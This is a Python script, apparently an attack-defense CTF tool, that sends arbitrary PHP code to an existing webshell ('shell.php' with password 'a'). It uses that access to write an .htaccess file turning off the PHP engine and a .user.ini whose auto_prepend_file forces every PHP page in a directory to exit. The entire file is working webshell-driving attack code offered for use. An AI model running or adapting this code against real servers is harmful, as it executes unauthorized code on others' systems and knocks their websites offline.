#!/usr/bin/python3
# -*- coding:utf-8 -*-

import requests, re, base64, time, random, string, hashlib
import pysnooper
from io import BytesIO
from urllib import parse


# 配置信息
config = {
    'debug': True,
    'proxies': {
        'http':'http://127.0.0.1:8080',
        'https':'https://127.0.0.1:8080'
        },
    'headers': {
        'Cookie': '',
    },
    'shell': 'http://127.0.0.1:8302/shell.php',
    'shellpass':'a',
}

def get_shell():
    url = ''
    return url


@pysnooper.snoop()
def execute_code(shell, password, code):
    try:
        evil_body = {
            password: code
        }
        res = requests.post(shell, data=evil_body, headers=config['headers'],timeout=5)
        if res.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        pass


def wrtie_htaccess(shell, password):
    # 这里主要写你要写入的配置文件路径
    filePath = "/var/www/html/uploads/.htaccess"
    content = """php_flag engine 0"""
    code = "file_put_contents({filePath},base64_decode({content}));var_dump('ok');".format(filePath=filePath.encode(), content=base64.b64encode(content.encode()))
    result = execute_code(shell, password, code)
    if result:
        print("[+]wrtie_htaccess Success!")
    else:
        print("[-]wrtie_htaccess Fail!")

def write_ini_user(shell, password):
    # 写入包含的文件路径
    tmpPath = '/tmp/php_root_000'
    content = """<?php exit(0);?>"""
    # .user.ini 的路径 这里需要自定义一下
    iniPath = "/var/www/html/public/upload"
    iniFullPath = iniPath + '/' + '.user.ini'
    iniContent = """auto_prepend_file={tmpPath}""".format(tmpPath=tmpPath)
    code = "file_put_contents({tmpPath},base64_decode({content}));".format(tmpPath=tmpPath.encode(), content=base64.b64encode(content.encode()))
    code += "file_put_contents({iniFullPath},base64_decode({iniContent}));".format(iniFullPath=iniFullPath.encode(), iniContent=base64.b64encode(iniContent.encode()))
    code += "var_dump('ok');"
    result = execute_code(shell, password, code)
    if result:
        print("[+]write_ini_user Success!")
    else:
        print("[-]write_ini_user Fail!")


def main():
    shell = config['shell'] if config['shell'] else get_shell()
    shellpass = config['shellpass'] if config['shellpass'] else 'xq17'
    # 写入htaccess文件
    # while(True):
        # wrtie_htaccess(shell, shellpass)
        # time.sleep(1)
    write_ini_user(shell, shellpass);



if __name__ == '__main__':
    main()